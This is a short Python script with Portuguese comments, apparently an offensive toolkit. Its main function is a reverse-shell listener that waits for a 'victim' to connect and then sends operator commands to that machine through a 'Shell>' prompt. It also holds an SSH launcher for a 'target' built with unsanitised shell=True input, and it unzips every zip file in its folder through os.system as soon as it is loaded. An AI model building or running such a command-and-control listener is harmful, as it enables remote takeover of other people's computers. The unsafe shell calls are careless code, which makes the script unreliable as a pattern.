import subprocess
import platform
import os
import sys
import socket
import time
from colorama import Fore, init, Style
def verificar_conexao():
    hostname = "google.com"  # Google DNS
    resposta = os.system(f"ping -c 1 {hostname} > /dev/null 2>&1")

    if resposta == 0:
        print("🟢 Você está ONLINE!")
        pass
    else:
        print("🔴 Você está OFFLINE! Nao pode continuar")
        sys.exit()

#verificar_conexao()

def SSH():
    nome = input("Nome do alvo: ")
    ip = input("IP do alvo: ")
    
    comando = f"ssh {nome}@{ip}"  # Corrige a string formatada
    subprocess.run(comando, shell=True)  # Executa o SSH no terminal
    #subprocess.run(f"ssh {nome}@{ip} ", shell=True)

def Plataforma():
    sistema=platform.system()
    if sistema=="Linux":
        print(f"{Fore.GREEN}PREPARANDO O AMBIENTE .... espere um instante")
        for ficheiro in os.listdir():
            if ficheiro.endswith(".zip"):
                os.system(f"unzip {ficheiro}")
    elif sistema=="Windows":
        for ficheiro in os.listdir():
            print(f'{Fore.GREEN}PREPARANDO O AMBIENTE...aguarde')
            if ficheiro.endswith(".zip"):
                os.system(f"tar -xf {ficheiro}")
       
Plataforma()
def servidor():
    # Recebe IP e porta como entrada
    servidor_ip ='127.0.0.1' # Digite o IP do servidor (ex: 192.168.1.100)
    servidor_porta = 8080  # Digite a porta do servidor (ex: 9999)

    # Configuração do servidor
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Cria o socket TCP/IP
    servidor.bind((servidor_ip, servidor_porta))  # Associa o IP e a porta ao servidor
    servidor.listen(1)  # O servidor escuta por conexões (máximo de 1 cliente por vez)

    print(f"{Fore.YELLOW}[*] Espearando a vitima se conectar: {servidor_ip}:{servidor_porta}...")

    # Espera por uma conexão
    conexao, endereco = servidor.accept()  # Aceita a conexão do cliente
    print(f"{Fore.GREEN}[**] Alvo conectado com sucesso {endereco}")

    # Loop para executar comandos
    while True:
        comando = input(f"{Fore.RED}Shell> ")  # Recebe comando do usuário no servidor
        if comando.lower() == 'exit':  # Comando para finalizar a conexão
            conexao.send(b"exit")  # Envia 'exit' para encerrar a conexão no cliente
            break

        # Envia o comando para a máquina alvo (cliente)
        conexao.send(comando.encode())

        # Recebe a resposta do comando executado no cliente
        resposta = conexao.recv(1024).decode()  # Recebe até 1024 bytes de resposta
        print(resposta)

    # Fecha a conexão
    conexao.close()  # Fecha a conexão com o cliente
    servidor.close()  # Fecha o servidor

